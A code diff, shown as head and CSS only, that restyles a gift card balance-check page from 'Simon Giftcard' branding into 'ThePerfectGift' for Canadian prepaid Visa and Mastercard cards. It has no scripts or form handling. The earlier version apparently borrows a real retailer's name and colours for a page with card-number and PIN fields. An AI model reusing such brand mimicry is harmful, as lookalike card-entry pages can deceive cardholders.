@@ -1,184 +1,408 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-CA">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Check your Simon Gift Card balance online. Enter your card number and PIN to see your available balance instantly.">
-  <title>Simon Giftcard - Check Your Balance</title>
+  <meta name="description" content="Check your Visa or Mastercard prepaid gift card balance online instantly. ThePerfectGift Canada provides fast, secure, and free balance verification.">
+  <meta name="keywords" content="gift card balance Canada, check balance, prepaid card Canada, Visa gift card, Mastercard gift card, gift card balance checker, Canadian gift card">
+  <meta name="geo.region" content="CA">
+  <meta name="geo.country" content="CA">
+  <title>ThePerfectGift - Check Your Gift Card Balance Online</title>
   <link rel="icon" type="image/svg+xml" href="/favicon.svg?v=3">
   <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root {
-      --simon-blue: #003DA5;
-      --simon-blue-dark: #002D7A;
-      --simon-blue-light: #0051D4;
-      --simon-gold: #C5A96A;
-      --simon-gold-light: #D4BD8A;
+      --primary: #1B2A4A;
+      --primary-dark: #0F1D35;
+      --primary-light: #2B4470;
+      --accent: #C8956C;
+      --accent-light: #E8C9A8;
+      --accent-dark: #A67548;
+      --gold: #D4A853;
+      --cream: #FDF8F3;
       --white: #ffffff;
-      --bg: #f5f5f5;
-      --text: #333333;
-      --text-muted: #666666;
-      --text-light: #999999;
-      --border: #ddd;
-      --border-light: #e8e8e8;
-      --success: #28a745;
-      --error: #dc3545;
-      --font: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      --bg: #F9FAFB;
+      --bg-warm: #FFFBF5;
+      --text: #1A1A2E;
+      --text-secondary: #4A5568;
+      --text-muted: #718096;
+      --text-light: #A0AEC0;
+      --border: #E2E8F0;
+      --border-light: #EDF2F7;
+      --success: #059669;
+      --success-light: #D1FAE5;
+      --error: #DC2626;
+      --error-light: #FEE2E2;
+      --shadow-sm: 0 1px 3px rgba(0,0,0,0.08);
+      --shadow-md: 0 4px 16px rgba(0,0,0,0.08);
+      --shadow-lg: 0 8px 30px rgba(0,0,0,0.1);
+      --shadow-xl: 0 20px 50px rgba(0,0,0,0.12);
+      --radius: 12px;
+      --radius-lg: 16px;
+      --font-body: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      --font-heading: 'Playfair Display', Georgia, serif;
     }
 
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; -webkit-font-smoothing: antialiased; }
+    html { scroll-behavior: smooth; }
+    body { font-family: var(--font-body); background: var(--white); color: var(--text); -webkit-font-smoothing: antialiased; line-height: 1.6; }
+    img { max-width: 100%; display: block; }
+    a { text-decoration: none; color: inherit; }
+    button { cursor: pointer; font-family: inherit; }
 
-    /* Top Banner */
-    .top-banner {
-      background: var(--simon-blue);
-      color: white;
+    .container { max-width: 1200px; margin: 0 auto; padding: 0 2rem; }
+
+    /* ═══════════════════════════════════
+       ANNOUNCEMENT BAR
+    ═══════════════════════════════════ */
+    .announcement-bar {
+      background: var(--primary);
+      color: rgba(255,255,255,0.9);
       text-align: center;
-      padding: 8px 16px;
+      padding: 10px 16px;
       font-size: 0.8rem;
-      letter-spacing: 0.5px;
+      font-weight: 500;
+      letter-spacing: 0.3px;
     }
+    .announcement-bar strong { color: var(--accent-light); }
 
-    /* Header */
+    /* ═══════════════════════════════════
+       HEADER
+    ═══════════════════════════════════ */
     .header {
       background: var(--white);
-      border-bottom: 3px solid var(--simon-gold);
-      padding: 0 2rem;
+      border-bottom: 1px solid var(--border);
+      position: sticky;
+      top: 0;
+      z-index: 50;
     }
     .header-inner {
       max-width: 1200px;
       margin: 0 auto;
+      padding: 0 2rem;
       display: flex;
       align-items: center;
       justify-content: space-between;
-      height: 70px;
+      height: 72px;
     }
     .logo {
       display: flex;
       align-items: center;
       gap: 12px;
       text-decoration: none;
-      color: var(--simon-blue);
     }
-    .logo-icon {
-      width: 44px;
-      height: 44px;
-      background: var(--simon-blue);
-      border-radius: 8px;
+    .logo-mark {
+      width: 42px;
+      height: 42px;
+      background: linear-gradient(135deg, var(--accent) 0%, var(--accent-dark) 100%);
+      border-radius: 10px;
       display: flex;
       align-items: center;
       justify-content: center;
-      color: white;
-      font-weight: 800;
-      font-size: 1.1rem;
-      letter-spacing: -0.5px;
+      position: relative;
+      box-shadow: 0 2px 8px rgba(200,149,108,0.3);
     }
-    .logo-text {
-      font-size: 1.6rem;
-      font-weight: 800;
-      color: var(--simon-blue);
-      letter-spacing: -0.5px;
+    .logo-mark svg { width: 22px; height: 22px; }
+    .logo-wordmark {
+      display: flex;
+      flex-direction: column;
     }
-    .logo-sub {
-      font-size: 0.7rem;
-      color: var(--simon-gold);
+    .logo-name {
+      font-family: var(--font-heading);
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: var(--primary);
+      line-height: 1.1;
+      letter-spacing: -0.3px;
+    }
+    .logo-tagline {
+      font-size: 0.65rem;
+      color: var(--accent);
       font-weight: 600;
       text-transform: uppercase;
-      letter-spacing: 2px;
-      margin-top: -2px;
+      letter-spacing: 1.5px;
     }
 
     .nav {
       display: flex;
+      align-items: center;
       gap: 0;
-      height: 100%;
-      align-items: stretch;
     }
     .nav a {
-      color: var(--text);
-      text-decoration: none;
+      color: var(--text-secondary);
       font-weight: 600;
       font-size: 0.875rem;
-      padding: 0 1.25rem;
-      display: flex;
-      align-items: center;
-      border-bottom: 3px solid transparent;
-      margin-bottom: -3px;
+      padding: 0.5rem 1.25rem;
+      border-radius: 8px;
       transition: all 0.2s;
     }
-    .nav a:hover { color: var(--simon-blue); border-bottom-color: var(--simon-blue); }
-    .nav a.active { color: var(--simon-blue); border-bottom-color: var(--simon-blue); }
+    .nav a:hover { color: var(--primary); background: var(--bg); }
+    .nav a.active { color: var(--primary); background: rgba(27,42,74,0.06); }
+    .nav .nav-cta {
+      background: var(--primary);
+      color: var(--white);
+      margin-left: 0.5rem;
+      padding: 0.6rem 1.5rem;
+      border-radius: 50px;
+    }
+    .nav .nav-cta:hover { background: var(--primary-dark); }
 
-    /* Hero Section */
+    .mobile-menu-btn {
+      display: none;
+      background: none;
+      border: none;
+      padding: 8px;
+      color: var(--text);
+    }
+
+    /* ═══════════════════════════════════
+       HERO SECTION
+    ═══════════════════════════════════ */
     .hero {
-      background: linear-gradient(135deg, var(--simon-blue) 0%, var(--simon-blue-dark) 100%);
-      padding: 3rem 2rem;
-      text-align: center;
-      color: white;
+      background: linear-gradient(135deg, var(--cream) 0%, #FFF5EB 50%, #FEF0E3 100%);
+      padding: 5rem 0 6rem;
       position: relative;
       overflow: hidden;
     }
     .hero::before {
       content: "";
       position: absolute;
-      top: -50%;
-      right: -20%;
-      width: 60%;
-      height: 200%;
-      background: rgba(255,255,255,0.03);
-      transform: rotate(20deg);
+      top: -40%;
+      right: -10%;
+      width: 50%;
+      height: 180%;
+      background: radial-gradient(ellipse, rgba(200,149,108,0.08) 0%, transparent 70%);
+    }
+    .hero-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 4rem;
+      align-items: center;
+    }
+    .hero-content { position: relative; z-index: 2; }
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: var(--white);
+      border: 1px solid var(--border);
+      border-radius: 50px;
+      padding: 6px 16px 6px 8px;
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: var(--text-secondary);
+      margin-bottom: 1.5rem;
+      box-shadow: var(--shadow-sm);
+    }
+    .hero-badge-dot {
+      width: 8px;
+      height: 8px;
+      background: var(--success);
+      border-radius: 50%;
+      animation: pulse 2s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
     }
     .hero h1 {
-      font-size: 2.25rem;
-      font-weight: 800;
-      margin-bottom: 0.5rem;
+      font-family: var(--font-heading);
+      font-size: 3.2rem;
+      font-weight: 700;
+      color: var(--primary);
+      line-height: 1.15;
       letter-spacing: -0.5px;
+      margin-bottom: 1.25rem;
     }
-    .hero p {
-      font-size: 1.05rem;
-      opacity: 0.85;
+    .hero h1 span { color: var(--accent); }
+    .hero-subtitle {
+      font-size: 1.1rem;
+      color: var(--text-secondary);
+      line-height: 1.7;
+      margin-bottom: 2rem;
+      max-width: 480px;
+    }
+    .hero-cta-group {
+      display: flex;
+      gap: 1rem;
+      align-items: center;
+    }
+    .btn-primary {
+      background: var(--primary);
+      color: var(--white);
+      padding: 0.9rem 2rem;
+      border-radius: 50px;
+      border: none;
+      font-size: 0.95rem;
+      font-weight: 700;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      transition: all 0.25s;
+      box-shadow: 0 4px 14px rgba(27,42,74,0.25);
+    }
+    .btn-primary:hover { background: var(--primary-dark); transform: translateY(-1px); box-shadow: 0 6px 20px rgba(27,42,74,0.3); }
+    .btn-secondary {
+      background: transparent;
+      color: var(--text-secondary);
+      padding: 0.9rem 1.5rem;
+      border-radius: 50px;
+      border: 2px solid var(--border);
+      font-size: 0.95rem;
+      font-weight: 600;
+      transition: all 0.25s;
+    }
+    .btn-secondary:hover { border-color: var(--primary); color: var(--primary); }
+    .hero-trust {
+      display: flex;
+      align-items: center;
+      gap: 1.5rem;
+      margin-top: 2.5rem;
+      padding-top: 2rem;
+      border-top: 1px solid rgba(0,0,0,0.06);
+    }
+    .hero-trust-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      font-weight: 500;
+    }
+    .hero-trust-item svg { color: var(--accent); flex-shrink: 0; }
+
+    /* Hero Visual - Woman with Cards */
+    .hero-visual {
+      position: relative;
+      z-index: 2;
+    }
+    .hero-image-wrapper {
+      position: relative;
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: var(--shadow-xl);
+      aspect-ratio: 4/5;
+      max-height: 520px;
+    }
+    .hero-image-wrapper img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      object-position: center top;
+    }
+    .hero-image-overlay {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      padding: 2rem;
+      background: linear-gradient(to top, rgba(27,42,74,0.85) 0%, transparent 100%);
+      color: white;
+    }
+    .hero-card-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255,255,255,0.15);
+      backdrop-filter: blur(10px);
+      border-radius: 50px;
+      padding: 8px 16px;
+      font-size: 0.82rem;
+      font-weight: 600;
+    }
+    .hero-floating-card {
+      position: absolute;
+      top: 20px;
+      right: -20px;
+      width: 180px;
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+      border-radius: 12px;
+      padding: 16px;
+      color: white;
+      box-shadow: var(--shadow-lg);
+      z-index: 3;
+      animation: floatCard 4s ease-in-out infinite;
+    }
+    @keyframes floatCard {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+    .hero-floating-card .fc-brand { font-size: 0.7rem; font-weight: 700; opacity: 0.8; letter-spacing: 1px; text-transform: uppercase; }
+    .hero-floating-card .fc-amount { font-size: 1.6rem; font-weight: 800; margin: 6px 0; }
+    .hero-floating-card .fc-label { font-size: 0.6rem; opacity: 0.6; letter-spacing: 0.5px; }
+    .hero-floating-card .fc-chip {
+      width: 28px; height: 20px;
+      background: linear-gradient(135deg, #ffd700, #daa520);
+      border-radius: 3px;
+      margin-top: 8px;
+    }
+
+    /* ═══════════════════════════════════
+       BALANCE CHECKER SECTION
+    ═══════════════════════════════════ */
+    .balance-section {
+      padding: 5rem 0;
+      background: var(--white);
+    }
+    .balance-section .section-header {
+      text-align: center;
+      margin-bottom: 3rem;
+    }
+    .section-label {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.78rem;
+      font-weight: 700;
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 0.75rem;
+    }
+    .section-title {
+      font-family: var(--font-heading);
+      font-size: 2.2rem;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 0.5rem;
+    }
+    .section-subtitle {
+      color: var(--text-muted);
+      font-size: 1rem;
       max-width: 500px;
       margin: 0 auto;
     }
 
-    /* Main Content */
-    .main-content {
-      max-width: 1100px;
-      margin: -2rem auto 3rem;
-      padding: 0 2rem;
-      position: relative;
-      z-index: 1;
-    }
-    .content-grid {
+    .balance-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 2rem;
+      gap: 2.5rem;
       align-items: start;
     }
-    @media (max-width: 850px) {
-      .content-grid { grid-template-columns: 1fr; }
-    }
 
-    /* Card Form Section */
+    /* Form Card */
     .form-card {
       background: var(--white);
-      border-radius: 12px;
+      border-radius: var(--radius-lg);
       padding: 2.5rem;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      box-shadow: var(--shadow-lg);
       border: 1px solid var(--border-light);
     }
-    .form-card h2 {
-      font-size: 1.35rem;
-      font-weight: 700;
-      color: var(--simon-blue);
-      margin-bottom: 0.4rem;
+    .form-card-header {
+      margin-bottom: 2rem;
     }
-    .form-card .subtitle {
+    .form-card-header h2 {
+      font-family: var(--font-heading);
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 0.3rem;
+    }
+    .form-card-header p {
       color: var(--text-muted);
       font-size: 0.9rem;
-      margin-bottom: 1.75rem;
-      line-height: 1.5;
     }
 
     .form-group {
@@ -186,20 +410,19 @@
     }
     .form-group label {
       display: block;
-      font-size: 0.85rem;
+      font-size: 0.82rem;
       font-weight: 600;
       color: var(--text);
       margin-bottom: 0.4rem;
     }
-    .form-group label .required {
-      color: var(--error);
-    }
+    .form-group label .required { color: var(--error); }
+    .form-group label .optional { font-weight: 400; color: var(--text-light); }
     .form-group input {
       width: 100%;
-      padding: 0.75rem 1rem;
+      padding: 0.8rem 1rem;
       font-size: 0.95rem;
-      border: 1px solid var(--border);
-      border-radius: 6px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
       transition: all 0.2s;
       font-family: inherit;
       color: var(--text);
@@ -207,35 +430,25 @@
     }
     .form-group input:focus {
       outline: 0;
-      border-color: var(--simon-blue);
-      box-shadow: 0 0 0 3px rgba(0, 61, 165, 0.1);
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(27,42,74,0.08);
     }
-    .form-group input::placeholder { color: #bbb; }
-    .form-group input.error { border-color: var(--error); }
+    .form-group input::placeholder { color: var(--text-light); }
+    .form-group input.error { border-color: var(--error); box-shadow: 0 0 0 3px rgba(220,38,38,0.08); }
 
-    .card-number-wrapper {
-      position: relative;
-    }
-    .card-number-wrapper input {
-      padding-right: 60px;
-    }
+    .card-number-wrapper { position: relative; }
+    .card-number-wrapper input { padding-right: 60px; }
     .card-brand-badge {
       position: absolute;
-      right: 10px;
+      right: 12px;
       top: 50%;
       transform: translateY(-50%);
       height: 28px;
       opacity: 0;
       transition: opacity 0.3s ease;
     }
-    .card-brand-badge.visible {
-      opacity: 1;
-    }
-    .card-brand-badge img {
-      height: 28px;
-      width: auto;
-      border-radius: 4px;
-    }
+    .card-brand-badge.visible { opacity: 1; }
+    .card-brand-badge img { height: 28px; width: auto; border-radius: 4px; }
 
     .field-error {
       font-size: 0.75rem;
@@ -255,111 +468,97 @@
       display: flex;
       align-items: flex-start;
       gap: 8px;
-      margin-top: 0.4rem;
-      padding: 0.6rem 0.75rem;
-      background: #f8f9fa;
-      border-radius: 6px;
+      margin-top: 0.5rem;
+      padding: 0.7rem 0.85rem;
+      background: var(--bg);
+      border-radius: 10px;
       font-size: 0.78rem;
       color: var(--text-muted);
-      line-height: 1.4;
+      line-height: 1.5;
     }
-    .pin-hint svg {
-      flex-shrink: 0;
-      margin-top: 1px;
-      color: var(--simon-blue);
-    }
+    .pin-hint svg { flex-shrink: 0; margin-top: 1px; color: var(--accent); }
 
     .btn-check {
-      background: var(--simon-blue);
+      background: var(--primary);
       color: white;
-      padding: 0.85rem 2rem;
-      border-radius: 6px;
+      padding: 0.9rem 2rem;
+      border-radius: 50px;
       border: none;
       font-size: 1rem;
       font-weight: 700;
-      cursor: pointer;
       width: 100%;
-      transition: all 0.2s;
-      margin-top: 0.75rem;
+      transition: all 0.25s;
+      margin-top: 1rem;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 8px;
-      letter-spacing: 0.3px;
+      box-shadow: 0 4px 14px rgba(27,42,74,0.2);
     }
-    .btn-check:hover { background: var(--simon-blue-dark); }
+    .btn-check:hover { background: var(--primary-dark); transform: translateY(-1px); }
     .btn-check:active { transform: scale(0.99); }
-    .btn-check:disabled { opacity: 0.65; cursor: not-allowed; }
+    .btn-check:disabled { opacity: 0.65; cursor: not-allowed; transform: none; }
 
     .btn-another {
       background: var(--white);
-      color: var(--simon-blue);
-      padding: 0.75rem 2rem;
-      border-radius: 6px;
-      border: 2px solid var(--simon-blue);
+      color: var(--primary);
+      padding: 0.8rem 2rem;
+      border-radius: 50px;
+      border: 2px solid var(--primary);
       font-size: 0.95rem;
       font-weight: 700;
-      cursor: pointer;
       width: 100%;
-      transition: all 0.2s;
+      transition: all 0.25s;
       margin-top: 1rem;
       display: none;
     }
-    .btn-another:hover { background: var(--simon-blue); color: white; }
+    .btn-another:hover { background: var(--primary); color: white; }
     .btn-another.show { display: block; }
 
-    /* Info Section */
-    .info-card {
-      background: var(--white);
-      border-radius: 12px;
-      padding: 2rem;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-      border: 1px solid var(--border-light);
-    }
+    /* Info Panel */
+    .info-panel { display: flex; flex-direction: column; gap: 1.5rem; }
 
-    /* Gift Card Visual */
-    .gc-visual {
+    .gc-visual-card {
       width: 100%;
       aspect-ratio: 1.6/1;
-      background: linear-gradient(135deg, var(--simon-blue) 0%, #001F5C 100%);
-      border-radius: 12px;
-      padding: 1.75rem;
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+      border-radius: var(--radius-lg);
+      padding: 2rem;
       color: white;
       position: relative;
       overflow: hidden;
-      margin-bottom: 1.5rem;
-      box-shadow: 0 8px 24px rgba(0, 61, 165, 0.3);
+      box-shadow: 0 12px 30px rgba(27,42,74,0.35);
     }
-    .gc-visual::before {
+    .gc-visual-card::before {
       content: "";
       position: absolute;
       top: -30%;
-      right: -15%;
+      right: -10%;
       width: 50%;
       height: 160%;
       background: rgba(255,255,255,0.04);
-      transform: rotate(20deg);
+      transform: rotate(15deg);
     }
-    .gc-visual::after {
+    .gc-visual-card::after {
       content: "";
       position: absolute;
       bottom: 0;
       left: 0;
       right: 0;
       height: 4px;
-      background: var(--simon-gold);
+      background: linear-gradient(90deg, var(--accent), var(--gold));
     }
-    .gc-brand {
-      font-size: 1.35rem;
-      font-weight: 800;
-      letter-spacing: -0.5px;
-      margin-bottom: 0.25rem;
+    .gc-brand-name {
+      font-family: var(--font-heading);
+      font-size: 1.3rem;
+      font-weight: 700;
+      margin-bottom: 0.15rem;
     }
     .gc-type {
-      font-size: 0.7rem;
+      font-size: 0.65rem;
       text-transform: uppercase;
       letter-spacing: 3px;
-      opacity: 0.7;
+      opacity: 0.6;
       font-weight: 600;
     }
     .gc-chip {
@@ -367,7 +566,7 @@
       height: 30px;
       background: linear-gradient(135deg, #ffd700, #daa520);
       border-radius: 5px;
-      margin: 1.25rem 0;
+      margin: 1.1rem 0;
       position: relative;
       overflow: hidden;
     }
@@ -379,7 +578,7 @@
     }
     .gc-number {
       font-family: 'Courier New', monospace;
-      font-size: 1.2rem;
+      font-size: 1.15rem;
       letter-spacing: 3px;
       margin-bottom: 1rem;
       text-shadow: 0 1px 3px rgba(0,0,0,0.3);
@@ -389,58 +588,50 @@
       justify-content: space-between;
       align-items: flex-end;
     }
-    .gc-label {
-      font-size: 0.55rem;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      opacity: 0.6;
-      margin-bottom: 2px;
-    }
-    .gc-value {
-      font-size: 0.85rem;
-      font-weight: 600;
-    }
+    .gc-label { font-size: 0.5rem; text-transform: uppercase; letter-spacing: 1px; opacity: 0.5; margin-bottom: 2px; }
+    .gc-value { font-size: 0.82rem; font-weight: 600; }
 
-    /* Info Items */
-    .info-title {
-      font-size: 1.1rem;
+    /* How It Works Card */
+    .how-it-works-card {
+      background: var(--white);
+      border-radius: var(--radius-lg);
+      padding: 2rem;
+      box-shadow: var(--shadow-md);
+      border: 1px solid var(--border-light);
+    }
+    .hiw-title {
+      font-size: 1rem;
       font-weight: 700;
-      color: var(--simon-blue);
-      margin-bottom: 1rem;
+      color: var(--primary);
+      margin-bottom: 1.25rem;
       display: flex;
       align-items: center;
       gap: 8px;
     }
-    .info-item {
+    .hiw-title svg { color: var(--accent); }
+    .hiw-step {
       display: flex;
-      gap: 12px;
-      margin-bottom: 1rem;
-      padding-bottom: 1rem;
+      gap: 14px;
+      margin-bottom: 1.1rem;
+      padding-bottom: 1.1rem;
       border-bottom: 1px solid var(--border-light);
     }
-    .info-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
-    .info-icon {
-      width: 36px;
-      height: 36px;
-      background: #f0f4ff;
-      border-radius: 8px;
+    .hiw-step:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+    .hiw-num {
+      width: 32px;
+      height: 32px;
+      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+      border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
+      color: white;
+      font-size: 0.75rem;
+      font-weight: 800;
       flex-shrink: 0;
-      color: var(--simon-blue);
     }
-    .info-text h4 {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--text);
-      margin-bottom: 2px;
-    }
-    .info-text p {
-      font-size: 0.8rem;
-      color: var(--text-muted);
-      line-height: 1.4;
-    }
+    .hiw-text h4 { font-size: 0.85rem; font-weight: 700; color: var(--text); margin-bottom: 2px; }
+    .hiw-text p { font-size: 0.78rem; color: var(--text-muted); line-height: 1.45; }
 
     /* Balance Result */
     .balance-result {
@@ -454,15 +645,15 @@
       to { opacity: 1; transform: translateY(0); }
     }
     .balance-result.success .result-box {
-      background: #f0fdf4;
-      border: 1px solid #bbf7d0;
-      border-radius: 12px;
+      background: var(--success-light);
+      border: 1px solid #A7F3D0;
+      border-radius: var(--radius-lg);
       padding: 2rem;
     }
     .balance-result.error .result-box {
-      background: #fef2f2;
-      border: 1px solid #fecaca;
-      border-radius: 12px;
+      background: var(--error-light);
+      border: 1px solid #FECACA;
+      border-radius: var(--radius-lg);
       padding: 2rem;
     }
     .result-icon {
@@ -473,51 +664,295 @@
       align-items: center;
       justify-content: center;
       margin: 0 auto 1rem;
-      font-size: 1.75rem;
+      font-size: 1.5rem;
       font-weight: 800;
     }
     .success .result-icon { background: var(--success); color: white; }
     .error .result-icon { background: var(--error); color: white; }
     .balance-label {
-      font-size: 0.85rem;
+      font-size: 0.82rem;
       color: var(--text-muted);
       text-transform: uppercase;
-      letter-spacing: 1px;
+      letter-spacing: 1.5px;
       font-weight: 600;
+    }
+    .balance-amount { margin: 0.5rem 0; }
+    .currency { font-size: 1.1rem; font-weight: 600; color: var(--text-muted); vertical-align: top; }
+    .amount { font-size: 3rem; font-weight: 800; color: var(--primary); letter-spacing: -1px; }
+    .card-info { font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem; }
+    .error-message { font-size: 0.95rem; color: var(--text); margin-top: 0.5rem; }
+
+    /* ═══════════════════════════════════
+       FEATURES SECTION
+    ═══════════════════════════════════ */
+    .features-section {
+      padding: 5rem 0;
+      background: var(--bg);
+    }
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 2rem;
+      margin-top: 3rem;
+    }
+    .feature-card {
+      background: var(--white);
+      border-radius: var(--radius-lg);
+      padding: 2.5rem 2rem;
+      text-align: center;
+      box-shadow: var(--shadow-sm);
+      border: 1px solid var(--border-light);
+      transition: all 0.3s;
+    }
+    .feature-card:hover {
+      transform: translateY(-4px);
+      box-shadow: var(--shadow-lg);
+    }
+    .feature-icon {
+      width: 64px;
+      height: 64px;
+      background: linear-gradient(135deg, var(--cream), #FFF0E0);
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1.25rem;
+      color: var(--accent);
+    }
+    .feature-card h3 {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--primary);
       margin-bottom: 0.5rem;
     }
-    .balance-amount {
-      margin: 0.5rem 0;
-    }
-    .currency {
-      font-size: 1.25rem;
-      font-weight: 600;
+    .feature-card p {
+      font-size: 0.9rem;
       color: var(--text-muted);
-      vertical-align: top;
-    }
-    .amount {
-      font-size: 3rem;
-      font-weight: 800;
-      color: var(--simon-blue);
-      letter-spacing: -1px;
-    }
-    .card-info {
-      font-size: 0.85rem;
-      color: var(--text-muted);
-      margin-top: 0.5rem;
-    }
-    .error-message {
-      font-size: 0.95rem;
-      color: var(--text);
-      margin-top: 0.5rem;
+      line-height: 1.6;
     }
 
-    /* Loading */
+    /* ═══════════════════════════════════
+       SUPPORTED CARDS SECTION
+    ═══════════════════════════════════ */
+    .supported-section {
+      padding: 4rem 0;
+      background: var(--white);
+      border-top: 1px solid var(--border-light);
+      border-bottom: 1px solid var(--border-light);
+    }
+    .supported-inner {
+      text-align: center;
+    }
+    .supported-inner p {
+      font-size: 0.9rem;
+      color: var(--text-muted);
+      margin-bottom: 2rem;
+    }
+    .card-logos {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 3rem;
+      flex-wrap: wrap;
+    }
+    .card-logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+    .card-logo-box {
+      width: 100px;
+      height: 64px;
+      background: var(--bg);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 1px solid var(--border);
+      padding: 12px;
+    }
+    .card-logo-box img { max-height: 36px; width: auto; }
+    .card-logo span { font-size: 0.75rem; font-weight: 600; color: var(--text-muted); }
+
+    /* ═══════════════════════════════════
+       PAGES (FAQ, ABOUT)
+    ═══════════════════════════════════ */
+    .page { display: none; }
+    .page.active { display: block; animation: fadeIn 0.3s ease-out; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+    .page-hero {
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+      padding: 3.5rem 2rem;
+      text-align: center;
+      color: white;
+      position: relative;
+      overflow: hidden;
+    }
+    .page-hero::before {
+      content: "";
+      position: absolute;
+      top: -50%;
+      right: -15%;
+      width: 50%;
+      height: 200%;
+      background: rgba(255,255,255,0.03);
+      transform: rotate(15deg);
+    }
+    .page-hero h1 {
+      font-family: var(--font-heading);
+      font-size: 2.25rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+    }
+    .page-hero p {
+      font-size: 1.05rem;
+      opacity: 0.8;
+      max-width: 500px;
+      margin: 0 auto;
+    }
+
+    .content-section {
+      background: var(--white);
+      border-radius: var(--radius-lg);
+      padding: 2.5rem;
+      box-shadow: var(--shadow-md);
+      border: 1px solid var(--border-light);
+      max-width: 800px;
+      margin: -2rem auto 0;
+      position: relative;
+      z-index: 1;
+    }
+    .content-section h2 {
+      font-family: var(--font-heading);
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 1rem;
+    }
+    .content-section p {
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+      margin-bottom: 1.25rem;
+      line-height: 1.7;
+    }
+
+    /* FAQ Accordion */
+    .faq-item {
+      border: 1px solid var(--border-light);
+      border-radius: 10px;
+      margin-bottom: 0.75rem;
+      overflow: hidden;
+      transition: all 0.2s;
+    }
+    .faq-item:hover { border-color: var(--border); }
+    .faq-question {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 1.1rem 1.25rem;
+      cursor: pointer;
+      background: var(--white);
+      transition: background 0.2s;
+    }
+    .faq-question:hover { background: var(--bg); }
+    .faq-question h4 {
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: var(--text);
+      flex: 1;
+    }
+    .faq-toggle {
+      width: 28px;
+      height: 28px;
+      background: var(--bg);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s;
+      flex-shrink: 0;
+      margin-left: 12px;
+    }
+    .faq-toggle svg { transition: transform 0.3s; color: var(--text-muted); }
+    .faq-item.open .faq-toggle { background: var(--primary); }
+    .faq-item.open .faq-toggle svg { transform: rotate(180deg); color: white; }
+    .faq-answer {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.3s ease-out;
+    }
+    .faq-answer-inner {
+      padding: 0 1.25rem 1.25rem;
+      font-size: 0.9rem;
+      color: var(--text-secondary);
+      line-height: 1.7;
+    }
+    .faq-item.open .faq-answer { max-height: 200px; }
+
+    /* ═══════════════════════════════════
+       FOOTER
+    ═══════════════════════════════════ */
+    .footer {
+      background: var(--primary-dark);
+      color: rgba(255,255,255,0.7);
+      padding: 0;
+    }
+    .footer-main {
+      padding: 3.5rem 0;
+      display: grid;
+      grid-template-columns: 2fr 1fr 1fr;
+      gap: 3rem;
+    }
+    .footer-brand .logo-name { color: white; font-size: 1.3rem; }
